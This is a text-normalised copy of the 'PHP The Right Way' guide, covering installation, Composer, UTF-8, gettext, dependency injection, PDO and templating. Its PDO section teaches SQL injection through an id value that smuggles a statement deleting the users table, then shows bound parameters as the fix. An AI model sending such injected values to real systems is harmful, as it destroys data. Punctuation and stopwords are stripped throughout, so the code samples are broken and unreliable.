rule lingohub tutorial list sample implementation discussion key gettext manual symfony documentation everyday usage sample template file including different gettext call sample setup file used selecting correct locale configuring gettext preparing translation first run poedit website translating string tip trick possible caching issue additional helper function oscarotero gettext specific format reference dependency injection wikipedia basic concept complex problem inversion control solid single responsibility principle openclosed principle liskov substitution principle interface segregation principle dependency inversion principle container database php mysqli pgsql mssql mysql extension mysql mysql deprecated php officially removed php mysqli pdo upgrading mysql mysqli beware lazy upgrade guide suggest simply find replace gross oversimplification miss advantage mysqli provides parameter binding also offered pdo pdo extension pdo sql injection filter data interacting database oop functional programming mvc framework foophp modelsfoomodelphp viewsfoolistphp unittest phpbridge creating data class abstraction layer pdo templating part benefit plain php template plate auraview simple example plain php template plate example plain php template using inheritance plate compiled template improved much twig brainy smarty mustache simple example compiled template twig example compiled template using inheritance twig reading article tutorial library error error severity changing php error reporting behaviour error reporting inline error suppression completely xdebug scream errorexception whoop errorexception class exception spl exception spl extension web application security basic web application security aslr open web application security project survive deep end php security password hashing two different thing specialized algorithm bcrypt hashing password data filtering null byte sanitization pdo html purifier see sanitization filter unserialization even object used validation see validation filter configuration file register globals note make sure error reporting development development phpnet reporting every possible error php version production production testing test driven development wikipedia unit testing phpunit integration testing wikipedia functional testing selenium mink codeception storyplayer behavior driven development behat cucumber phpspec rspec project bdd link behat cucumber phpspec rspec codeception server deployment platform service paas php paas platform service provider resource section virtual dedicated server nginx phpfpm nginx apache php module prefork mpm worker mpm event mpm modproxyfcgi shared server php version building deploying application build automation phing apache ant capistrano ansistrano capistrano rocketeer deployer easy deployment php application deployer magallanes reading server provisioning ansible puppet chef reading continuous integration travis ci reading virtualization vagrant vagrant puppet chef little help puphpet heavily focused php protobox phansible docker docker example running php application docker installing docker learn docker docker hub docker user guide official repositiories phpdockerio caching opcode cache opcodes zend opcache opcacheenable object caching learn popular object caching system phpdoc tag phpdoc manual author link author link param return throw param return people follow php paas provider php version framework component dependency management fuelphp validation package illuminate component useful resource cheatsheets php cheatsheets owasp security cheatsheets best practice news around php web development community list php universe video tutorial youtube channel paid video book partly free book paid book build apis hate modern php building secure php apps modernizing legacy application php securing php core concept scaling php signaling php minimum viable test domaindriven design php php user group phpug meetupcom google nomadphp phpwomen nomadphp phpwomen read user group php wiki php conference find php conference elephpants elephpant vincent pontier interview vincent pontier,welcome lot outdated information web lead new php user astray propagating bad practice insecure code php right way easytoread quick reference php popular coding standard link authoritative tutorial around web contributor consider best practice present time canonical way use php website aim introduce new php developer topic may discover late aim give seasoned pro fresh idea topic year without ever reconsidering website also tell tool use instead offer suggestion multiple option possible explaining difference approach usecase living document continue updated helpful information example become available translation php right way translated many different language book recent version php right way also available pdf epub mobi format go leanpub contribute help make website best resource new php programmer contribute github use current stable version getting started php start current stable release php php add many new feature older version engine largely rewritten php even quicker older version try upgrade latest stable version quickly php already end life upgrading easy many backwards compatibility break sure version function feature check php documentation phpnet website builtin web server php newer start learning php without installing configuring fullfledged web server start server run following command terminal project web root php mac setup macos come prepackaged php normally little behind latest stable release multiple way install latest php version macos install php via homebrew homebrew package manager macos help easily install php various extension homebrew core repository provides formula php install latest version command switch homebrew php version modifying path variable alternatively use brewphpswitcher switch php version automatically install php via macports macports project opensource community initiative design easytouse system compiling installing upgrading either commandline aqua based opensource software o x operating system macports support precompiled binary need recompile every dependency source tarball file save life package installed system point install using port install command example sudo port install sudo port install run select command switch active php sudo port select set php install php via phpbrew phpbrew tool installing managing multiple php version really useful two different applicationsprojects require different version php using virtual machine install php via liip binary installer another popular option phposxliipch provides one liner installation method version overwrite php binary installed apple installs everything separate location compile source another option give control version php install compile case sure installed either xcode apple substitute command line tool xcode downloadable apple mac developer center allinone installers solution listed mainly handle php supply thing like apache nginx sql server allinone solution mamp xampp install bit software tie together ease setup come tradeoff flexibility window setup download binary windowsphpnetdownload extraction php recommended set path root php folder phpexe located execute php anywhere learning local development use built webserver php need worry configuring would like allinone includes fullblown webserver mysql tool web platform installer xampp easyphp openserver wamp help get window development environment running fast said tool little different production careful environment difference working window deploying linux need run production system window give stable best performance use phpmanager gui plugin make configuring managing php simple come fastcgi built ready go need configure php handler support additional resource dedicated area iisnet php generally running application different environment development production lead strange bug popping go live developing window deploying linux anything nonwindows consider using virtual machine chris tankersley helpful blog post tool us php development using window common directory structure common question among starting writing program web put stuff year answer consistently documentroot although answer complete great place start security reason configuration file accessible site visitor therefore public script kept public directory private configuration data kept outside directory team cm framework one work standard directory structure used entity however one starting project alone knowing filesystem structure use daunting paul jones done fantastic research common practice ten thousand github project realm php compiled standard file directory structure standard php package skeleton based research directory structure documentroot point public unit test test directory third party library installed composer belong vendor directory file directory abiding standard php package skeleton make sense contributor project code style guide php community large diverse composed innumerable library framework component common php developer choose several combine single project important php code adhere close possible common code style make easy developer mix match various library project framework interop group proposed approved series style recommendation related codestyle recommendation merely set rule many project like drupal zend symfony laravel cakephp phpbb aws sdk fuelphp lithium etc adopting use project continue use personal style ideally write php code adheres known standard could combination psrs one coding standard made pear zend mean developer easily read work code application implement component consistency even working lot thirdparty code use phpcodesniffer check code one recommendation plugins text editor like sublime text given realtime feedback fix code layout automatically using one following tool run phpcs manually shell phpcs sw filephp show error describe fix also helpful include command git hook way branch contain violation chosen standard enter repository violation fixed phpcodesniffer fix code layout problem reported automatically php code beautifier fixer phpcbf w filephp another option use php coding standard fixer show kind error code structure fixed phpcsfixer fix v rule filephp english preferred symbol name code infrastructure comment may written language easily readable current future party may working codebase finally good supplementary resource writing clean php code clean code php programming paradigm php flexible dynamic language support variety programming technique evolved dramatically year notably adding solid objectoriented model php anonymous function namespaces php trait php objectoriented programming php complete set objectoriented programming feature including support class abstract class interface inheritance constructor cloning exception functional programming php support firstclass function meaning function assigned variable userdefined builtin function referenced variable invoked dynamically function passed argument function feature called higherorder function function return function recursion feature allows function call supported language php code focused iteration new anonymous function support closure present since php php added ability bind closure object scope also improved support callables used interchangeably anonymous function almost case php support various form metaprogramming mechanism like reflection api magic method many magic method available like get set clone tostring invoke etc allow developer hook class behavior ruby developer often say php lacking methodmissing available call callstatic namespaces mentioned php community lot developer creating lot code mean one library php code might use class name another library used namespace collide cause trouble namespaces solve problem described php reference manual namespaces may compared operating system directory namespace file two file name may coexist separate directory likewise two php class name may coexist separate php namespaces simple important namespace code may used developer without fear colliding library one recommended way use namespaces outlined aim provide standard file class namespace convention allow plugandplay code october phpfig deprecated previous autoloading standard still perfectly usable latter requires php many php project implement going use autoloader standard new application package look standard php library standard php library spl packaged php provides collection class interface made primarily commonly needed datastructure class stack queue heap iterators traverse datastructures class implement spl interface command line interface php created write web application also useful scripting command line interface cli program command line php program help automate common task like testing deployment application administration cli php program powerful use app code directly without create secure web gui sure put cli php script public web root try running php command line php option print php configuration like phpinfo function option provides interactive shell similar ruby irb python interactive shell number useful command line option let write simple hello name cli program try create file named hellophp php argc echo usage php hellophp name n exit name argv echo hello namen php set two special variable based argument script run argc integer variable containing argument count argv array variable containing argument value first argument always name php script file case hellophp exit expression used nonzero number let shell know command failed commonly used exit code found run script command line php hellophp usage php hellophp name php hellophp world hello world xdebug one useful tool software development proper debugger allows trace execution code monitor content stack xdebug php debugger utilized various ides provide breakpoints stack inspection also allow tool like phpunit kcachegrind perform code coverage analysis code profiling find bind willing resort vardump printr still find solution maybe need use debugger installing xdebug tricky one important feature remote debugging develop code locally test inside vm another server remote debugging feature want enable right away traditionally modify apache vhost htaccess file value phpvalue xdebugremotehost phpvalue xdebugremoteport remote host remote port correspond local computer port configure ide listen matter putting ide listen connection mode loading url http yourwebsiteexamplecomindexphp ide intercept current state script executes allowing set breakpoints probe value memory graphical debugger make easy step code inspect variable eval code live runtime many ide builtin pluginbased support graphical debugging xdebug macgdbp free opensource standalone xdebug gui mac dependency management ton php library framework component choose project likely use several project dependency recently php good way manage project dependency even managed manually still worry autoloader longer issue currently two major package management system php composer pear composer currently popular package manager php however long time pear primary package manager use knowing pear history good idea since may still find reference even never use composer packagist composer recommended dependency manager php list project dependency composerjson file simple command composer automatically download project dependency setup autoloading composer analogous npm nodejs world bundler ruby world plethora php library compatible composer ready used project package listed packagist official repository composercompatible php library install composer safest way download composer following official instruction verify installer corrupt tampered installer installs composerphar binary current working directory recommend installing composer globally eg single copy usrlocalbin run command next mv composerphar usrlocalbincomposer note fails due permission prefix sudo run locally installed composer use php composerphar globally simply composer installing window window user easiest way get running use composersetup installer performs global install set path call composer directory command line define install dependency composer keep track project dependency file called composerjson manage hand like use composer composer require command add project dependency composerjson file one created example add twig dependency project composer require twigtwig alternatively composer init command guide creating full composerjson file project either way created composerjson file tell composer download install dependency vendor directory also applies project downloaded already provide composerjson file composer install next add line application primary php file tell php use composer autoloader project dependency php require vendorautoloadphp use project dependency autoloaded demand updating dependency composer creates file called composerlock store exact version package downloaded first ran composer install share project others ensure composerlock file included run composer install get version update dependency run composer update use composer update deploying composer install otherwise may end different package version production useful define version requirement flexibly instance version requirement mean anything newer le also use wildcard composer composer update command upgrade dependency newest version fit restriction define update notification receive notification new version release sign librariesio web service monitor dependency send alert update checking dependency security issue security advisory checker web service commandline tool examine composerlock file tell need update dependency handling global dependency composer composer also handle global dependency binary usage straightforward need prefix command global example wanted install phpunit available globally run following command composer global require phpunitphpunit create composer folder global dependency reside installed package binary available everywhere add composervendorbin folder path variable pear veteran package manager php developer enjoy pear behaves similarly composer notable difference pear requires package specific structure mean author package must prepare usage pear using project prepared work pear possible pear installs package globally mean installing available project server good many project rely package version might lead problem version conflict two project arise install pear install pear downloading phar installer executing pear documentation detailed install instruction every operating system using linux also look distribution package manager debian ubuntu example apt phppear package install package package listed pear package list install specifying official name pear install foo package hosted another channel need discover channel first also specify installing see using channel doc information topic handling pear dependency composer already using composer would like install pear code use composer handle pear dependency example install code repository type pear url http require first section repository used let composer know initialize discover pear terminology pear repo require section prefix package name like pearchannelpackage pear prefix hardcoded avoid conflict pear channel could another package vendor name example channel short name full url used reference channel package code installed available vendor directory automatically available composer autoloader use pear package simply reference like php request new basic php vast language allows coder level ability produce code quickly efficiently however advancing language often forget basic first learnt overlooked favor short cut andor bad habit help combat common issue section aimed reminding coder basic coding practice within php date time php class named datetime help reading writing comparing calculating date time many date time related function php besides datetime provides nice objectoriented interface common us handle time zone outside short introduction start working datetime convert raw date time string object createfromformat factory method new datetime get current date time use format method convert datetime back string output php raw start datetime createfromformat raw echo start date start format ymd n calculating datetime possible dateinterval class datetime method like add sub take dateinterval argument write code expect number second every day daylight saving timezone alteration break assumption use date interval instead calculate date difference use diff method return new dateinterval super easy display php create copy start add one month day end clone start end add new dateinterval diff end diff start echo difference diff format month day total day n difference month day total day datetime object use standard comparison php start end echo start end n one last example demonstrate dateperiod class used iterate recurring event take two datetime object start end interval return event php output thursday start end periodinterval dateinterval createfromdatestring first thursday perioditerator new dateperiod start periodinterval end dateperiod excludestartdate foreach perioditerator date output date period echo date format ymd popular php api extension carbon inherits everything datetime class involves minimal code alteration extra feature include localization support way add subtract format datetime object plus mean test code simulating date time choosing design pattern building application helpful use common pattern code common pattern overall structure project using common pattern helpful make much easier manage code let developer quickly understand everything fit together use framework higher level code project structure based framework lot pattern decision made still pick best pattern follow code build top framework hand using framework build application find pattern best suit type size application building learn php design pattern see working example http designpatternsphpreadthedocsio working section originally written alex cabal php best practice used basis advice oneliner careful detailed consistent right php support unicode low level way ensure string processed ok easy requires digging almost level web app html sql php aim brief practical summary php level basic string operation like concatenating two string assigning string variable need anything special however string function like strpos strlen need special consideration function often mb counterpart example mbstrpos mbstrlen mb string made available via multibyte string extension specifically designed operate unicode string must use mb function whenever operate unicode string example use substr string good chance result include garbled halfcharacters correct function use would multibyte counterpart mbsubstr hard part remembering use mb function time forget even unicode string chance garbled processing string function mb counterpart one want might luck use mbinternalencoding function top every php script write top global include script mbhttpoutput function right script outputting browser explicitly defining encoding string every script save lot headache road additionally many php function operate string optional parameter letting specify character encoding always explicitly indicate given option example htmlentities option character encoding always specify dealing string note php default encoding htmlentities htmlspecialchars finally building distributed application certain mbstring extension enabled consider using composer package use mbstring available fall back non function database level php script access mysql chance string could stored string database even follow precaution make sure string go php mysql make sure database table set character set collation use character set pdo connection string see example code critically important note must use character set complete support character set see reading browser level use mbhttpoutput function ensure php script output string browser browser need told http response page considered today common set character set http response header like php header contenttype texthtml historic approach include charset meta tag page head tag php tell php using string end script mbinternalencoding utfset iniset defaultcharset utfset throw new exception could set defaultcharset please ensure set system tell php outputting browser mbhttpoutput test string string êl síla erin lû egovaned vîn transform string way multibyte function note cut string nonascii character demonstration purpose string mbsubstr string connect database store transformed string see pdo example document information note data source name dsn link new pdo mysql hostyourhostname dbnameyourdb yourusername yourpassword array pdo attrerrmode pdo errmodeexception pdo attrpersistent false store transformed string database db table character set collation right handle link prepare insert elvishsentences id body priority value default body priority handle bindparam body string pdo paramstr priority handle bindparam priority priority pdo paramint explicitly tell pdo expect int handle execute retrieve string stored prove stored correctly handle link prepare select elvishsentences id id id handle bindparam id id pdo paramint handle execute store result object output later html object wo nt kill memory fetch data justintime result handle fetchall pdo fetchobj example wrapper allow escape data html function escapetohtml dirty echo htmlspecialchars dirty entquotes header contenttype texthtml unnecessary defaultcharset set already doctype html html head meta charset title test page title head body php foreach result row escapetohtml row body correctly output transformed string browser body html reading internationalization localization disclaimer newcomer numeronyms kind abbreviation number used shorten word case internationalization becomes localization first need define two similar concept related thing internationalization organize code adapted different language region without refactorings action usually done preferably beginning project else probably need huge change source localization happens adapt interface mainly translating content based work done usually done every time new language region need support updated new interface piece added need available supported language pluralization defines rule required distinct language interoperate string containing number counter instance english one item singular anything different called plural plural language indicated adding word sometimes change part language russian serbian two plural form addition singular may even find language total four five six form slovenian irish arabic common way implement easiest way internationalize php software using array file using string template trans titleaboutpage way however hardly recommended serious project pose maintenance issue along road might appear beginning pluralization please try project contain couple page classic way often taken reference unix tool called gettext date back still complete implementation translating software easy enough get running still sporting powerful supporting tool gettext talking also help get messy commandline presenting great gui application used easily update source common library used support gettext implementation may seem easier install sport additional feature file format document focus tool provided php core list others completion auraintl provides internationalization tool specifically packageoriented perlocale message translation us array format message provide message extractor provide advanced message formatting via intl extension including pluralized message oscaroterogettext gettext support oo interface includes improved helper function powerful extractor several file format supported natively gettext command also export format besides mopo file useful need integrate translation file part system like javascript interface symfonytranslation support lot different format recommends using verbose xliff include helper function builtin extractor support placeholder using strtr internally support array ini file gettext format implement caching layer save reading filesystem every time also includes view helper localeaware input filter validators however message extractor framework also include module available outside codebases laravel support basic array file automatic extractor includes lang helper template file yii support array gettext databasebased translation includes message extractor backed intl extension available since php based icu project enables yii run powerful replacement like spelling number formatting date time interval currency ordinal decide go one library provide extractor may want use gettext format use original gettext toolchain including poedit described rest chapter gettext installation might need install gettext related php library using package manager like aptget yum installed enable adding extensiongettextso linuxunix extensionphpgettextdll window phpini also using poedit create translation file probably find system package manager available unix mac window downloaded free website well structure type file three file usually deal working gettext main one po portable object mo machine object file first list readable translated object second corresponding binary interpreted gettext localization also pot template file simply contains existing key source file used guide generate update po file template file mandatory depending tool using go fine pomo file always one pair pomo file per language region one pot per domain domain case big project might need separate translation word convey different meaning given context case split different domain basically named group potpomo file filename said translation domain small mediumsized project usually simplicity use one domain name arbitrary using main code sample symfony project example domain used separate translation validation message locale code locale simply code identifies one version language defined following iso iso spec two lowercase letter language optionally followed underline two uppercase letter identifying country regional code rare language three letter used speaker country part may seem redundant fact language dialect different country austrian german deat brazilian portuguese ptbr second part used distinguish dialect present taken generic hybrid version language directory structure use gettext need adhere specific structure folder first need select arbitrary root file source repository inside folder needed locale fixed lcmessages folder contain pomo pair example project root src template locale forumpot sitepot de lcmessages forummo forumpo sitemo sitepo es lcmessages fr ptbr ptpt plural form said introduction different language might sport different plural rule however gettext save u trouble creating new po file declare plural rule language translated piece pluralsensitive different form rule calling gettext code specify number related sentence work correct form use even using string substitution needed plural rule include number plural available boolean test n would define rule given number fall starting count example japanese one rule english plural n two rule first n one second rule otherwise brazilian portuguese plural n two rule second n bigger one first otherwise understood basis plural rule work please look deeper explanation lingohub tutorial might want copy one need list instead writing hand calling gettext localization sentence counter provide related number well gettext work rule effect use correct localized version need include po file different sentence plural rule defined sample implementation theory let get little practical excerpt po file mind format overall content instead learn edit easily later msgid msgstr language ptbrn contenttype textplain pluralforms plural n n msgid translating string msgstr nós estamos traduzindo algumas string agora msgid hello last visit msgstr olá sua última visita foi em msgid one unread message msgidplural unread message msgstr só uma mensagem não lida msgstr mensagens não lidas first section work like header msgid msgstr especially empty describes file encoding plural form thing le relevant second section translates simple string english brazilian portuguese third leveraging string replacement sprintf translation may contain user name visit date last section sample pluralization form displaying singular plural version msgid english corresponding translation msgstr following number given plural rule string replacement used well number seen directly sentence using plural form always two msgid singular plural advised use complex language source translation discussion key might noticed using source id actual sentence english msgid used throughout po file meaning language format msgid field translated msgstr line talking translation key two main school msgid real sentence main advantage piece software untranslated given language key displayed still maintain meaning example happen translate heart english spanish need help translate french might publish new page missing french sentence part website would displayed english instead much easier translator understand going proper translation based msgid give free one language source one disadvantage need change actual text would need replace msgid across several language file msgid unique structured key would describe sentence role application structured way including template part string located instead content great way code organized separating text content template logic however could bring problem translator would miss context source language file would needed basis translation example developer would ideally enpo file translator would read understand write frpo instance missing translation would display meaningless key screen topmenuwelcome instead hello user said untranslated french page good would force translation complete publishing however bad translation issue would remarkably awful interface library though include option specify given language fallback similar behavior approach gettext manual favor first approach general easier translator user case trouble working well however symfony documentation favor keywordbased translation allow independent change translation without affecting template well everyday usage typical application would use gettext function writing static text page sentence would appear po file get translated compiled mo file used gettext rendering actual interface given let tie together discussed far stepbystep example sample template file including different gettext call php include div id header sprintf gettext welcome name code indented way legibility php unread sprintf ngettext one unread message unread message unread unread php endif div gettext introduction p gettext translating string p gettext simply translates msgid corresponding msgstr given language also shorthand function work way ngettext plural rule also dgettext dngettext allows override domain single call domain configuration next example sample setup file used selecting correct locale configuring gettext php verifies given locale supported project param string locale return bool function valid locale return inarray locale enus en ptbr pt es e setting sourcedefault locale informational purpose lang enus isset get lang valid get lang locale changed querystring lang get lang sanitize setcookie lang lang stored cookie reused elseif isset cookie lang valid cookie lang cookie present instead let keep lang cookie lang sanitize elseif isset server httpacceptlanguage default look language browser say user accepts langs explode server httpacceptlanguage arraywalk langs function lang lang strtr strtok lang foreach langs browserlang valid browserlang lang browserlang break define global system locale given found language putenv lang lang might useful date function lctime money formatting lcmonetary instance setlocale lcall lang make gettext look locale lang lcmessagesmainmo bindtextdomain main locale indicates encoding file read bindtextdomaincodeset main application additional domain cited bind well bindtextdomain forum locale bindtextdomaincodeset forum indicate default domain gettext call respond textdomain main would look string forummo instead mainmo echo dgettext forum welcome back preparing translation first run one great advantage gettext custom framework package extensive powerful file format oh man quite hard understand edit hand simple array would easier make mistake application like poedit help lot get program website free available platform pretty easy tool get used powerful one time using feature gettext available guide based poedit first run select file menu asked straight ahead language selectfilter language want translate use format mentioned enus ptbr save file using directory structure mentioned well click extract source configure various setting extraction translation task able find later catalog property source path must include folder project gettext sibling called usually templatesviews folder mandatory setting translation property project name version team team email address useful information go po file header plural form go rule mentioned link sample well leave default option time poedit already includes handy database plural rule many language charsets preferably source code charset set charset used codebase probably well right source keywords underlying software know gettext similar function call look like several programming language might well create translation function add method discussed later tip section setting point run scan source file find localization call every scan poedit display summary found removed source file new entry fed empty translation table start typing localized version string save mo file compiled folder tadah project internationalized translating string may noticed two main type localized string simple one plural form first one simply two box source localized string source string modified gettextpoedit include power alter source file change source rescan file tip may rightclick translation line hint source file line string used hand plural form string include two box show two source string tab configure different final form whenever change source need update translation hit refresh poedit rescan code removing nonexistent entry merging one changed adding new one may also try guess translation based one guess changed entry receive fuzzy marker indicating need review appearing golden list also useful translation team someone try write something sure mark fuzzy someone else review later finally advised leave view untranslated entry first marked help lot forget entry menu also open part ui allow leave contextual information translator needed tip trick possible caching issue running php module apache modphp might face issue mo file cached happens first time read update might need restart server nginx usually take couple page refreshes refresh translation cache rarely needed additional helper function preferred many people easier use instead gettext many custom library framework use something similar well make translated code shorter however function sport shortcut might want add project others n ngettext maybe fancy r would join gettext sprintf call library oscarotero gettext also provide helper function like case need instruct gettext utility extract string new function afraid easy field po file setting screen poedit editor option inside catalog property source keywords remember gettext already know default function many language afraid list seems empty need include specification new function following specific format create something like simply return translation string specify gettext know function argument string translated function one argument specify one first string needed plural form well instance call function like one user user number specification would meaning first form first argument second form second argument number come first argument instead spec would indicating first form second argument including new rule po file new scan bring new string easy reference dependency injection wikipedia dependency injection software design pattern allows removal hardcoded dependency make possible change whether runtime compiletime quote make concept sound much complicated actually dependency injection providing component dependency either constructor injection method call setting property simple basic concept demonstrate concept simple yet naive example database class requires adapter speak database instantiate adapter constructor create hard dependency make testing difficult mean database class tightly coupled adapter php namespace database class database protected adapter public function construct adapter new mysqladapter class mysqladapter code refactored use dependency injection therefore loosen dependency php namespace database class database protected adapter public function construct mysqladapter adapter adapter adapter class mysqladapter giving database class dependency rather creating could even create method would accept argument dependency set way adapter property public could set directly complex problem ever read dependency injection probably seen term inversion control dependency inversion principle complex problem dependency injection solves inversion control inversion control say inverting control system keeping organizational control entirely separate object term dependency injection mean loosening dependency controlling instantiating elsewhere system year php framework achieving inversion control however question became part control inverting example mvc framework would generally provide super object base controller controller must extend gain access dependency inversion control however instead loosening dependency method simply moved dependency injection allows u elegantly solve problem injecting dependency need need without need hard coded dependency solid single responsibility principle single responsibility principle actor highlevel architecture state class one reason change mean every class responsibility single part functionality provided software largest benefit approach enables improved code reusability designing class one thing use reuse program without changing openclosed principle openclosed principle class design feature extension state software entity class module function etc open extension closed modification mean design module class function way new functionality needed modify existing code rather write new code used existing code practically speaking mean write class implement adhere interface typehint interface instead specific class largest benefit approach easily extend code support something new without modify existing code meaning reduce qa time risk negative impact application substantially reduced deploy new code faster confidence liskov substitution principle liskov substitution principle subtyping inheritance state child class never break parent class type definition robert c martin word subtypes must substitutable base type example fileinterface interface defines embed method audio video class implement fileinterface interface expect usage embed method always thing intend later create pdf class gist class implement fileinterface interface already know understand embed method largest benefit approach ability build flexible easilyconfigurable program change one object type eg fileinterface another need change anything else program interface segregation principle interface segregation principle isp businesslogictoclients communication state client forced depend method use mean instead single monolithic interface conforming class need implement instead provide set smaller conceptspecific interface conforming class implement one example car bus class would interested steeringwheel method motorcycle tricycle class would conversely motorcycle tricycle class would interested handlebar method car bus class would need type vehicle implement support steeringwheel well handlebar breakapart source interface dependency inversion principle dependency inversion principle removing hardlinks discrete class new functionality leveraged passing different class state one depend abstraction depend concretion put simply mean dependency interfacescontracts abstract class rather concrete implementation easily refactor example follow principle php namespace database class database protected adapter public function construct adapterinterface adapter adapter adapter interface adapterinterface class mysqladapter implement adapterinterface several benefit database class depending interface rather concretion consider working team adapter worked colleague first example would wait said colleague finish adapter could properly mock unit test dependency interfacecontract happily mock interface knowing colleague build adapter based contract even bigger benefit method code much scalable year line decide want migrate different type database write adapter implement original interface injects instead refactoring would required ensure adapter follows contract set interface container first thing understand dependency injection container thing dependency injection container convenience utility help u implement dependency injection however often misused implement antipattern service location injecting di container service locator class arguably creates harder dependency container dependency replacing also make code much le transparent ultimately harder test modern framework dependency injection container allows wire dependency together configuration mean practice write application code clean de coupled framework built database many time php code use database persist information option connect interact database recommended option php use native driver mysqli pgsql mssql etc native driver great using one database application example using mysql little bit mssql need connect oracle database able use driver need learn brand new api database get silly mysql extension mysql extension php incredibly old superseded two extension development stop long ago mysql deprecated php officially removed php save digging phpini setting see module using one option search mysql editor choice function mysqlconnect mysqlquery show mysql use even using php yet failing consider upgrade soon possible lead greater hardship php upgrade come best option replace mysql usage mysqli pdo application within development schedule rushed later upgrading mysql mysqli beware lazy upgrade guide suggest simply find replace mysql mysqli gross oversimplification miss advantage mysqli provides parameter binding also offered pdo pdo extension pdo database connection abstraction library built php since provides common interface talk many different database example use basically identical code interface mysql sqlite php pdo mysql pdo new pdo mysql hostexamplecom dbnamedatabase user password statement pdo query select somefield sometable row statement fetch pdo fetchassoc echo htmlentities row somefield pdo sqlite pdo new pdo sqlite pathdbfoosqlite statement pdo query select somefield sometable row statement fetch pdo fetchassoc echo htmlentities row somefield pdo translate sql query emulate missing feature purely connecting multiple type database api importantly pdo allows safely inject foreign input eg id sql query without worrying database sql injection attack possible using pdo statement bound parameter let assume php script receives numeric id query parameter id used fetch user record database wrong way php pdo new pdo sqlite pathdbusersdb pdo query select name user id get id terrible code inserting raw query parameter sql query get hacked heartbeat using practice called sql injection imagine hacker pass inventive id parameter calling url like http domaincom set get id variable delete user delete user instead sanitize id input using pdo bound parameter php pdo new pdo sqlite pathdbusersdb stmt pdo prepare select name user id id id filterinput inputget id filtersanitizenumberint filter data first see data filtering datafiltering especially important insert update etc stmt bindparam id id pdo paramint automatically sanitized sql pdo stmt execute correct code us bound parameter pdo statement escape foreign input id introduced database preventing potential sql injection attack writes insert update especially critical still filter data first sanitize thing removal html tag javascript etc pdo sanitize sql application also aware database connection use resource unheardof resource exhausted connection implicitly closed however common language using pdo implicitly close connection destroying object ensuring remaining reference deleted ie set null explicitly php automatically close connection script end unless course using persistent connection interacting database developer first start learn php often end mixing database interaction presentation logic using code might look like ul php foreach db query select table row echo li row row li ul bad practice sort reason mainly hard debug hard test hard read going output lot field put limit many solution depending prefer oop functional programming must element separation consider basic step php function getallfoos db return db query select table result getallfoos db foreach result row echo li row row li bad good start put two item two different file got clean separation create class place method model create simple php file put presentation logic view nearly mvc common oop architecture framework foophp php db new pdo mysql hostlocalhost dbnametestdb username password make model available include modelsfoomodelphp create instance foomodel new foomodel db get list foos foolist foomodel getallfoos show view include viewsfoolistphp modelsfoomodelphp php class foomodel protected db public function construct pdo db db db public function getallfoos return db query select table viewsfoolistphp php foreach foolist row li row row li php endforeach essentially modern framework albeit little manual might need every time mixing together much presentation logic database interaction real problem ever want unittest application phpbridge great resource called creating data class cover similar topic great developer getting used concept interacting database abstraction layer many framework provide abstraction layer may may sit top pdo often emulate feature one database system missing another wrapping query php method giving actual database abstraction instead connection abstraction pdo provides course add little overhead building portable application need work mysql postgresql sqlite little overhead worth sake code cleanliness abstraction layer built using namespace standard installed application like templating template provide convenient way separating controller domain logic presentation logic template typically contain html application may also used format xml template often referred view make part second component mvc software architecture pattern benefit main benefit using template clear separation create presentation logic rest application template sole responsibility displaying formatted content responsible data lookup persistence complex task lead cleaner readable code especially helpful team environment developer work serverside code controller model designer work clientside code markup template also improve organization presentation code template typically placed view folder defined within single file approach encourages code reuse larger block code broken smaller reusable piece often called partial example site header footer defined template included page template finally depending library use template offer security automatically escaping usergenerated content library even offer sandboxing template designer given access whitelisted variable function plain php template plain php template simply template use native php code natural choice since php actually template language simply mean combine php code within code like html beneficial php developer new syntax learn know function available code editor already php syntax highlighting autocompletion builtin plain php template tend fast compiling stage required every modern php framework employ kind template system use plain php default outside framework library like plate auraview make working plain php template easier offering modern template functionality inheritance layout extension simple example plain php template using plate library php userprofilephp php insert header title user profile user profile p hello escape name p php insert footer example plain php template using inheritance using plate library php templatephp html head title title title head body main section content main body html php userprofilephp php layout template title user profile user profile p hello escape name p compiled template php evolved mature object oriented language improved much templating language compiled template like twig brainy smarty fill void offering new syntax geared specifically templating automatic escaping inheritance simplified control structure compiled template designed easier write cleaner read safer use compiled template even shared across different language mustache good example since template must compiled slight performance hit however minimal proper caching used smarty offer automatic escaping feature enabled default simple example compiled template using twig library include headerhtml title user profile user profile p hello name p include footerhtml example compiled template using inheritance using twig library templatehtml html head title block title endblock title head body main block content endblock main body html userprofilehtml extends templatehtml block title user profile endblock block content user profile p hello name p endblock reading article tutorial library error many exceptionheavy programming language whenever anything go wrong exception thrown certainly viable way thing php exceptionlight programming language exception core starting use working object php try keep processing regardless happens unless fatal error occurs example php php echo foo notice undefined variable foo php shell code line notice error php happily carry confusing coming exceptionheavy language referencing missing variable python example throw exception python print foo traceback recent call last file stdin line module nameerror name foo defined real difference python freak small thing developer super sure potential issue edgecase caught whereas php keep processing unless something extreme happens point throw error report error severity php several level error severity three common type message error notice warning different level severity eerror enotice ewarning error fatal runtime error usually caused fault code need fixed cause php stop executing notice advisory message caused code may may cause problem execution script execution halted warning nonfatal error execution script halted another type error message reported compile time estrict message message used suggest change code help ensure best interoperability forward compatibility upcoming version php changing php error reporting behaviour error reporting changed using php setting andor php function call using built php function errorreporting set level error duration script execution passing one predefined error level constant meaning want see error warning notice configure php errorreporting eerror ewarning also control whether error displayed screen good development hidden logged good production information check error reporting section inline error suppression also tell php suppress specific error error control operator put operator beginning expression error direct result expression silenced php echo foo bar output foo bar exists simply return null print nothing variable foo bar key exist without error control operator expression could create php notice undefined variable foo php notice undefined index bar error might seem like good idea undesirable tradeoff php handle expression using le performant way expression without premature optimization may root programming argument performance particularly important applicationlibrary important understand error control operator performance implication secondly error control operator completely swallow error error displayed error sent error log also stockproduction php system way turn error control operator may correct error seeing harmless different le harmless error silent way avoid error suppression operator consider example code could rewritten like php null coalescing operator echo foo bar one instance error suppression might make sense fopen fails find file load could check existence file try load file deleted check fopen might sound impossible happen fopen return false throw error potentially something php resolve one case error suppression might seem like valid solution earlier mentioned way stock php system turn error control operator however xdebug xdebugscream ini setting disable error control operator set via phpini file following xdebugscream also set value runtime iniset function php iniset xdebugscream scream php extension offer similar functionality xdebug although scream ini setting named screamenabled useful debugging code suspect informative error suppressed use scream care temporary debugging tool lot php library code may work error control operator disabled errorexception php perfectly capable exceptionheavy programming language requires line code make switch basically throw error exception using errorexception class extends exception class common practice implemented large number modern framework symfony laravel debug mode dev mode framework display nice clean stack trace also package available better error exception handling reporting like whoop come default installation laravel used framework well throwing error exception development handle better usual result see exception development wrap catch statement specific instruction handle situation exception catch instantly make application little bit robust information detail use errorexception error handling found errorexception class exception exception standard part popular programming language often overlooked php programmer 